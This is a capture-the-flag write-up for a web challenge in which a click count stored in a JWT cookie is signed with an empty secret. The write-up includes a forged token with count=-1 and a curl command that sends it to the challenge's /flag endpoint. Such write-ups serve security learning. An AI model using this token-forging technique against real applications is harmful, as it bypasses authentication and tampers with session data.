# Lower Numbers Web Challenge

## Challenge Description
Everyone knows that lower numbers are cooler.
Get the flag from the web app.
Website: https://cpp.bootupctf.net:8085/

## Analysis
- Dashboard shows a count starting at 0
- `/add` endpoint increases the count
- `/flag` endpoint returns "You have TOO MANY clicks" when count > 0
- Hint: "lower numbers are cooler" suggests negative numbers or 0
- Additional hint: "only consider the negative number"

## Vulnerability
The application uses JWT tokens to store the click count in cookies, with a weak secret (empty string).

## Solution
**JWT Manipulation Attack**

1. **Identify the JWT**: The application stores count in JWT cookie named 'd'
2. **Decode existing JWT**: Shows structure `{"count": <number>}`
3. **Weak Secret Discovery**: The JWT uses an empty string ("") as the HMAC secret
4. **Forge negative JWT**: Create new JWT with `{"count": -1}`
5. **Access flag**: Use forged JWT to access `/flag` endpoint

### Working JWT with count=-1:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6LTF9.9VBxY0JLEIjg0ihGZ0ZxRIoXT74pCQS7YZbFZsfpRk8
```

### Verification Command:
```bash
curl -H 'Cookie: d=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6LTF9.9VBxY0JLEIjg0ihGZ0ZxRIoXT74pCQS7YZbFZsfpRk8' https://cpp.bootupctf.net:8085/flag
```

## Flag
**[REDACTED]**

## Technical Details
- **JWT Structure**: Header: `{"alg":"HS256","typ":"JWT"}`, Payload: `{"count":-1}`
- **Secret**: Empty string `""`
- **Signature Algorithm**: HMAC SHA256
- **Key Insight**: The hint "only consider the negative number" pointed to JWT manipulation rather than trying to overflow or find hidden endpoints

## Tools Used
- jwt.io (for understanding JWT structure)
- Python (for JWT creation with HMAC)
- curl (for testing)

## Lessons Learned
- Always check for weak JWT secrets (empty strings, common passwords)
- Pay attention to specific hints in CTF challenges
- JWT manipulation is often more effective than trying to find application logic flaws
